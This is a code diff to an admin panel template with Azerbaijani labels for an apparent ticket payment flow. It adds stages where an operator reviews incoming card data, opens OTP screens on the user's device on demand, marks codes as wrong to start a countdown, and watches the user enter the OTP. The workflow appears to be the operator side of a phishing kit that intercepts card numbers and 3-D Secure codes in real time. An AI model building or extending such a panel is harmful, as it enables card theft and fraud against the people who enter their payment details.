@@ -98,7 +98,7 @@
 
                 <div style="display:flex;gap:8px">
                   <button class="btn btn--primary btn--lg" data-approve-final="<%= p._id %>" style="flex:1">
-                    ✅ Bilet Ver
+                    ✅ Təsdiq Et (Bilet ver)
                   </button>
                   <button class="btn btn--warning btn--lg" data-reject-otp="<%= p._id %>" style="flex:1">
                     ❌ Səhv Kod
@@ -106,6 +106,36 @@
                   <button class="btn btn--outline btn--lg" data-decline="<%= p._id %>" style="flex:1">
                     🚫 Rədd Et
                   </button>
+                </div>
+              <% } else if (p.stage === 'card_review' && p.status === 'pending_admin') { %>
+                <div class="alert alert--info mb-16">
+                  <strong>💳 Yeni kart məlumatı daxil oldu</strong><br>
+                  Təsdiq etdikdə istifadəçinin ekranında DƏRHAL OTP ekranı açılacaq.
+                </div>
+                <div style="display:flex;gap:8px">
+                  <button class="btn btn--primary btn--lg" data-approve-card="<%= p._id %>" style="flex:1">
+                    ✅ Təsdiq Et (OTP ekranını aç)
+                  </button>
+                  <button class="btn btn--outline btn--lg" data-decline="<%= p._id %>" style="flex:1">
+                    🚫 Rədd Et
+                  </button>
+                </div>
+              <% } else if (p.stage === 'wrong_code') { %>
+                <div class="alert alert--warning mb-16">
+                  <strong>⏱️ Səhv OTP — istifadəçidə 2 dəq geri sayım gedir</strong><br>
+                  Geri sayım bitdikdə yeni OTP ekranı avtomatik açılacaq<% if (p.rejectionCount) { %> (Səhv kod: <%= p.rejectionCount %> dəfə)<% } %>.
+                </div>
+                <div style="display:flex;gap:8px">
+                  <button class="btn btn--primary btn--lg" data-open-otp="<%= p._id %>" style="flex:1">
+                    🔄 Yeni OTP ekranını indi aç
+                  </button>
+                  <button class="btn btn--outline btn--lg" data-decline="<%= p._id %>" style="flex:1">
+                    🚫 Rədd Et
+                  </button>
+                </div>
+              <% } else if (p.stage === 'otp_entry' && p.status === 'awaiting_3ds') { %>
+                <div class="alert alert--warning">
+                  🔐 İstifadəçi OTP kodunu daxil edir...
                 </div>
               <% } else if (p.status === 'approved') { %>
                 <div class="alert alert--success">
@@ -158,14 +188,18 @@
   }
 
   document.addEventListener('click', async function (e) {
-    const btn = e.target.closest('[data-approve-final], [data-reject-otp], [data-decline]');
+    const btn = e.target.closest('[data-approve-card], [data-open-otp], [data-approve-final], [data-reject-otp], [data-decline]');
     if (!btn) return;
     
     e.preventDefault();
     btn.disabled = true;
     
     let url = '';
-    if (btn.hasAttribute('data-approve-final')) {
+    if (btn.hasAttribute('data-approve-card')) {
+      url = '/api/admin/payments/' + btn.getAttribute('data-approve-card') + '/approve-card';
+    } else if (btn.hasAttribute('data-open-otp')) {
+      url = '/api/admin/payments/' + btn.getAttribute('data-open-otp') + '/open-otp';
+    } else if (btn.hasAttribute('data-approve-final')) {
       url = '/api/admin/payments/' + btn.getAttribute('data-approve-final') + '/approve-final';
     } else if (btn.hasAttribute('data-reject-otp')) {
       url = '/api/admin/payments/' + btn.getAttribute('data-reject-otp') + '/reject-otp';
